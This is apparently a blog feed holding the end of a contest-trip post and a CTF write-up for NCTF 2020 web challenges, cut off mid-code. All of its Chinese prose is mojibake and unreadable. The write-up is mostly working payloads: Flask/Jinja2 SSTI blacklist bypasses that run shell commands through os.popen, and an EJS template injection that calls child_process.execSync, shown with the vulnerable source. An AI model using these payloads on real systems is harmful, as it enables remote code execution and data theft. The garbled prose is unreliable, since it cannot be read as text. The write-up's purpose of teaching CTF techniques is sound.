‡çš„è·ç¦»åœ¨é˜ˆå€¼èŒƒå›´å†…åˆ™è®¤ä¸º grabï¼Œè¿™æ ·æŒç»­ 256 è½®åæ¯”è°çš„ç”¨æ—¶çŸ­<br>ï¼ˆèµ›åé—®äº† THU Nanoï¼Œæœç„¶æ­äº†ä¸ªç¥ç»ç½‘ç»œå»è®­ç»ƒ Orzï¼Œåé¢æœ‰æœºä¼šå†æ¥å¤ç°ä¸€ä¸‹è¿™ä¸ª8</li><li>æ¯”å¦‚å¦ä¸€ä¸ª KOH æ¶‰åŠå¤šçº¿ç¨‹å’Œ pipe è¯»å†™ï¼Œæ‰§è¡Œæäº¤ä¸Šå»çš„ shellcodeï¼Œåœ¨å®ç°åŠŸèƒ½çš„å‰æä¸‹æ¯”è°çš„é•¿åº¦çŸ­<br>ï¼ˆé˜Ÿå‹æ‰‹æ“ shellcode ç„¶åæŒ‰ç…§ byte ä¼˜åŒ–ï¼Œå”‰éƒ½æ˜¯æˆ‘ä¸æ‡‚çš„ä¸œè¥¿</li></ul><p>æ¯”å¦‚â€¦å•Šæ²¡äº†ï¼Œå°±è¿™äº›é¢˜äº†ï¼Œå¯èƒ½è¯´çš„ä¸å¤§å¯¹æ•¬è¯·æŒ‡æ­£ Orzã€‚</p><p>åæ­£è¹²å®˜æ–¹å’Œå¤§è€é¼ ä»¬çš„ WriteUp å°±æ˜¯äº†ã€‚</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210142309695.png"></p><hr><h2 id="ä¸€äº›æœ‰æ„æ€çš„äº‹"><a href="#ä¸€äº›æœ‰æ„æ€çš„äº‹" class="headerlink" title="ä¸€äº›æœ‰æ„æ€çš„äº‹"></a>ä¸€äº›æœ‰æ„æ€çš„äº‹</h2><ul><li><p>åˆ°äº†å¼€å¹•å¼æ‰çŸ¥é“ï¼ŒåŸæ¥ X-NUCA çš„çœŸæ­£è¯»æ³•ç±»ä¼¼äº <code>[eks ËˆnjuËkÉ‘Ë(r)]</code></p></li><li><p>æ¯”èµ›ç°åœºä¸»åŠæ–¹æä¾›ç‚¹æ­ŒæœåŠ¡ï¼Œå¥½è¯„</p></li><li><p>èƒ½è¿çƒ­ç‚¹ä¸Šå¤–ç½‘ï¼Œä½†è¢«å†…å¤–ç½‘åŒç½‘å…³æŠ˜ç£¨äº†è´¼ä¹…ï¼Œå¼€èµ›ååŠä¸ªå¤šå°æ—¶åœ¨ç ”ç©¶æ€ä¹ˆé…ç½‘ï¼Œæœ€åæ‰‹åŠ¨é…ç½®è·¯ç”±ç­–ç•¥ä»¥åŠå¸®é˜Ÿå‹é…ï¼ˆå¯èƒ½ç®—æ˜¯é‚£ä¹ˆä¸€ç‚¹ç‚¹æ¯”èµ›ä½“éªŒå§ï¼Œé˜Ÿå‹åŠ¨ä¸åŠ¨æ‹”æ’æ‹”æ’ç½‘çº¿æœ‰ç”»é¢æ„Ÿäº†å§</p></li><li><p>é¢å¥–å…¸ç¤¼æºœå‡ºå»é€›äº†ä¸€åœˆæ·±åœ³å¤§å­¦æ ¡å›­ï¼Œæ ¡å›­å¥½å¤§è¿˜æœ‰è§‚å…‰è½¦ï¼ˆæ ¡å†…ç­è½¦ï¼Ÿï¼‰ï¼Œè¿˜çœ‹åˆ°äº†é«˜å°”å¤«æ•™å­¦å®éªŒä¸­å¿ƒï¼Œæœ‰é’±æœ‰é’±ï¼Œxmsl</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143048802.png"></p></li><li><p>é¢å¥–å…¸ç¤¼ç»“æŸåå¯ä»¥æ‹¿å›æˆ˜é˜Ÿçš„æ——å­ï¼Œå•Šæ˜¯çœŸæ­£çš„å¤ºæ——èµ› 233</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143528486.png" alt="çœŸæ­£çš„å¤ºæ——èµ›"></p></li><li><p>é™ˆå›½è‰¯é™¢å£«çš„æŠ¥å‘Šï¼Œå·¦ä¸‹è§’ <code>The above picture is from the Internet</code>ï¼Œæœ‰ç‚¹è®²ç©¶ã€‚</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210141636177.png"></p><p>ç„¶åç¾¤å‹åšäº†ä¸‹é¢è¿™ä¸ªå›¾ï¼ˆ</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210141730257.png"></p></li><li><p>æˆåŠŸå’Œ Nohn ä»¥åŠ æœ€å¼ºå¤§è„‘è„‘ç‹ NanoApe é¢åŸºï¼Œåœ†äº†æŠ± Nano çš„å°å¿ƒæ„¿ï¼Œè¦åˆ°äº† Nano ç­¾åï¼Œå–µï¼Œå¥½å°ä¸€åªçœŸçš„å¥½å¯çˆ±ï¼Œiäº†iäº†ï¼</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210142439751.png" alt="è¶…å¤§çš„ Nano"></p></li><li><p>å»æ·±åœ³æ¹¾å…¬å›­ã€æ·±åœ³äººæ‰å…¬å›­è½¬äº†è½¬ï¼Œæµ·è¾¹å„ç§è‘—åä¼ä¸šçš„é«˜æ¥¼å¤§å¦ï¼Œå¤œæ™¯è´¼ä¸é”™</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143624706.png" alt="æ·±åœ³äººæ‰å…¬å›­"></p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143639686.png" alt="æ·±åœ³äººæ‰å…¬å›­"></p></li><li><p>é…’åº—åºŠå¤´å±…ç„¶æ²¡æœ‰æ’åº§ï¼Œå·®è¯„ï¼</p><p>ä¸è¿‡çª—å¤–çš„é£æ™¯è¿˜è¡Œï¼ˆ</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143846486.png" alt="ç™½å¤©"></p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201210143859938.png" alt="å¤œæ™š"></p><p><em>ï¼ˆè¯è¯´è¿œå¤„çš„è…¾è®¯å¤§å¦é‡Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸€å † 996 å‘¢</em></p></li><li><p>æ·±åœ³çš„åœ°é“è¿˜åˆ†ç©ºè°ƒå¼ºå†·å’Œå¼±å†·è½¦å¢ï¼Œè½¦å¢å†…çš„æ˜¾ç¤ºå±å¯¹å‡ºå£ã€ä¸Šä¸‹ç”µæ¢¯çš„ä½ç½®æ ‡è¯†æŒºæ¸…æ¥šçš„ï¼Œå¥½è¯„ã€‚</p><p><img src="/2020/12/10/Life_2020XNUCA_trip/image-20201211414545140.png" alt="åœ°é“è½¦å¢å†…æ˜¾ç¤ºå±"></p></li><li><p>etc.</p></li></ul><p>æ€»ä¹‹è¿™å‡ å¤©ç©å¾—å€’æ˜¯æŒºå¼€å¿ƒçš„ï¼Œå–µå–µ~</p><p>ï¼ˆæºœäº†æºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 NCTF/NJUPTCTF éƒ¨åˆ†WriteUp</title>
      <link href="2020/11/23/CTF_2020NJUPTCTF/"/>
      <url>2020/11/23/CTF_2020NJUPTCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201123214801335.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ä¸€å¹´ä¸€åº¦çš„ NCTF åˆæ¥äº†ã€‚</p><p>åˆšåˆšè¿‡å»çš„è¿™å‘¨æœ«æ¯”èµ›æœ‰ç‚¹å¤šï¼Œä»¥è‡³äºæ‰“èµ·æ¥æœ‰ç‚¹ä½›ç³»ã€‚</p><p>å—é‚®çš„å¸ˆå‚…ä»¬å‡ºé¢˜å¾ˆä¸é”™ï¼Œå—¯ï¼Œ<strong>å€¼å¾—è¢«é”¤</strong>ã€‚</p><p>æœŸå¾…äº†åŠå¤©å‘ç°æ²¡æœ‰çœŸæ­£çš„ Misc é¢˜ï¼Œæœ‰äº¿ç‚¹ç‚¹éš¾å—ï¼Œæ²¡åŠæ³•åªèƒ½ç¡¬è‚ Web é¢˜äº†ï¼Œå¤ªéš¾é¡¶äº†ã€‚</p><p>è¿™é‡Œå°±å†™ä¸€ä¸‹æˆ‘åšçš„å‡ é“é¢˜çš„ WriteUp å¥½äº†ã€‚ <del>ï¼ˆé¡ºä¾¿åæ§½ä¸€ä¸‹</del></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ä½ å°±æ˜¯æˆ‘çš„masterå—"><a href="#ä½ å°±æ˜¯æˆ‘çš„masterå—" class="headerlink" title="ä½ å°±æ˜¯æˆ‘çš„masterå—"></a>ä½ å°±æ˜¯æˆ‘çš„masterå—</h3><blockquote><p>æ¥ç­¾ä¸ªåˆ°å­~</p><p>å¤‡ç”¨åœ°å€ï¼š<a href="http://42.192.72.11:10001~10007">http://42.192.72.11:10001~10007</a></p></blockquote><p><strong>Flask SSTI.</strong></p><p>ç”¨ <code>\x5f</code> æ¥æ›¿ä»£ <code>_</code>ï¼Œè¿‡æ»¤æ‰çš„å…³é”®è¯ç”¨ <code>""</code> åŒå¼•å·æ‹¼æ¥å°±å¥½äº†ã€‚</p><p><strong>Payload:</strong></p><p>çœ‹çœ‹å½“å‰ç›®å½•æœ‰å•¥ã€‚</p><pre class="language-none"><code class="language-none">http://42.192.72.11:10001/?name={{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]()}}</code></pre><pre class="language-html" data-language="html"><code class="language-html">æ—©å®‰ï¼Œæ‰“å·¥äºº<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>ä½ å°±æ˜¯æˆ‘çš„app.pywo_ta_niang_de_bu_shi_ni_de_fla9å—ï¼Ÿ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token comment">&lt;!--   ?name=master  --&gt;</span></code></pre><p>è¯» flagï¼š</p><pre class="language-none"><code class="language-none">http://42.192.72.11:10001/?name={{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat *")["read"]()}}</code></pre><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122005324372.png" alt="flag"></p><p>æºç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'base'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'init'</span><span class="token punctuation">,</span><span class="token string">'global'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'req'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">,</span><span class="token string">'get'</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> name<span class="token punctuation">:</span>        <span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">'ä½ çœŸæ˜¯ä¸ªå°å¯çˆ±'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"æ—©å®‰ï¼Œæ‰“å·¥äºº&lt;br/&gt;ä½ å°±æ˜¯æˆ‘çš„"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"å—ï¼Ÿ&lt;br/&gt;&lt;!--   ?name=master  --&gt;"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>NCTF{ni_t@_niang_dee_jiu_shi_woo_de_master_ma}</code></p><p>è¿™çœŸçš„æ˜¯ç­¾åˆ°é¢˜ä¹ˆï¼Ÿ</p><p>ï¼ˆå™¢å¯¹äº†ï¼Œå‡ºé¢˜äººè¯´è¿™è¿˜æ˜¯éé¢„æœŸï¼Œemmm</p><blockquote><p>å®˜æ–¹ payload å¦‚ä¸‹ï¼Œå™¢æ˜¯è¿™ä¸ªæ„æ€çš„ <strong>å…¨åå…­è¿›åˆ¶</strong> å”‰ã€‚ç¡®å®å·®ä¸å¤šã€‚</p><pre class="language-none"><code class="language-none">?name={{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("ls")["\x72\x65\x61\x64"]()}}</code></pre></blockquote><h3 id="JS-world"><a href="#JS-world" class="headerlink" title="JS-world"></a>JS-world</h3><blockquote><p>JavaScript can quickly turn our everyday job into hell, and some of them can make us laugh out loud. Have fun.</p><p>hint1: script.js has sth useful.</p><p><a href="http://42.192.72.11:8090/">http://42.192.72.11:8090/</a></p></blockquote><p>é¦–å…ˆçœ‹äº†ä¸€ä¸‹åç«¯æ˜¯ Expressï¼Œç”¨äº† <a href="https://ejs.bootcss.com/">EJS æ¨¡æ¿å¼•æ“</a> æ¥æ¸²æŸ“é¡µé¢ã€‚</p><p>è°ƒè¯•åˆ†æäº†ä¸€ä¸‹é€»è¾‘ï¼ŒJS é€†å‘æœ‰ä¸€ç‚¹ç‚¹éº»çƒ¦ã€‚</p><p>æœ¬æ¥è¿˜è§£æ··æ·†äº†ä¸€ä¸‹ï¼Œä¸è¿‡åæ¥å‘ç°è²Œä¼¼æ²¡å¿…è¦äº†ï¼Œä¹Ÿå¹¶ä¸éœ€è¦é€†å‘äº†ã€‚</p><p>é‡ç‚¹åœ¨ <code>/js/script.js</code> æ–‡ä»¶é‡Œå¯¹è¾“å…¥çš„ code ä¸€äº›å…³é”®å­—è¿›è¡Œè¿‡æ»¤ä»¥åŠåŠ å¯†ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122022055366.png" alt="debug"></p><p><strong>å…³é”®æºç ï¼š</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> _0x1bef85 <span class="token operator">=</span> _0x1656      <span class="token punctuation">,</span> _0x23132f <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x9'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'MyCode'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xe'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    _0x23132f <span class="token operator">=</span> _0x23132f<span class="token punctuation">[</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x5'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\/\*\'\"\`\&lt;\\\&gt;\-\(\)\[\]\=\%\.]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x1658d5 <span class="token operator">=</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> _0x23132f <span class="token operator">+</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _0x1658d5 <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x1658d5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x23601e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _0x23601e<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x13'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x7'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _0x23601e<span class="token punctuation">[</span><span class="token string">'setRequestHeader'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x11'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x3deb5a <span class="token operator">=</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x4'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>_0x1658d5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> _0x23601e<span class="token punctuation">[</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xa'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3deb5a<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Done.\x0aCheck\x20/templates\x20now.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å…¶ä¸­ï¼Œ<code>document[_0x1bef85('0x9')]('MyCode')[_0x1bef85('0xe')]</code> å°±æ˜¯é€šè¿‡ <code>getElementById</code> è·å¾—è¾“å…¥çš„æ•°æ®ã€‚</p><p><code>_0x23132f[_0x1bef85('0x5')]</code> å‡½æ•°ä¸º <code>replace</code>ï¼Œå¯è§æŠŠè¿™äº›ç¬¦å·ç»™è¿‡æ»¤æ‰äº†ã€‚</p><p>ä¹‹åè¿™æ®µæ˜¯è¿›è¡ŒåŠ å¯†ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> _0x1658d5 <span class="token operator">=</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> _0x23132f <span class="token operator">+</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>_0x1658d5 <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x1658d5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æœ€åè°ƒç”¨ <code>XMLHttpRequest</code> æŠŠæ•°æ®å‘ç»™åç«¯ã€‚</p><p>åœ¨ <code>/templates</code> ç›®å½•å°±èƒ½çœ‹åˆ°ç”Ÿæˆçš„é¡µé¢äº†ã€‚</p><p>å› æ­¤åšé¢˜çš„è¯ï¼Œç›´æ¥æŠŠè¿‡æ»¤çš„è¿™æ¡è¯­å¥åˆ äº†å°±å¥½äº†ã€‚</p><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ä¼ å‚äº†ã€‚</p><p>æŠŠè¿™æ®µæ”¾åˆ°æµè§ˆå™¨ Console é‡Œæ‰§è¡Œï¼Œè¦†ç›–æ‰åŸæ¥çš„å‡½æ•°ï¼Œå†ä¼ å‚è¿›å»æ‰§è¡Œå°±å®Œäº‹ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token parameter">xx</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> _0x1bef85 <span class="token operator">=</span> _0x1656      <span class="token punctuation">,</span> _0x23132f <span class="token operator">=</span> xx<span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x1658d5 <span class="token operator">=</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> _0x23132f <span class="token operator">+</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _0x1658d5 <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x1658d5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x23601e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _0x23601e<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x13'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x7'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _0x23601e<span class="token punctuation">[</span><span class="token string">'setRequestHeader'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x11'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x3deb5a <span class="token operator">=</span> <span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0x4'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>_0x1658d5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> _0x23601e<span class="token punctuation">[</span><span class="token function">_0x1bef85</span><span class="token punctuation">(</span><span class="token string">'0xa'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3deb5a<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Done.\x0aCheck\x20/templates\x20now.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è€ƒè™‘åˆ°æ˜¯ ejs æ¨¡æ¿å¼•æ“ï¼Œåº”è¯¥å°±æ˜¯ ejs æ³¨å…¥äº†ã€‚</p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œå‚è€ƒ <a href="https://www.gem-love.com/ctf/2462.html">Y1ng å¸ˆå‚…çš„è„šæœ¬</a>ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122022431766.png" alt="payload"></p><pre class="language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat app.js'</span><span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span></code></pre><p>è¿™æ ·å¯ä»¥è¯»å–æºç ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"cookie-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express-session"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> FileStore <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'session-file-store'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> __dirname <span class="token operator">+</span> <span class="token string">'/views'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>renderFile<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token 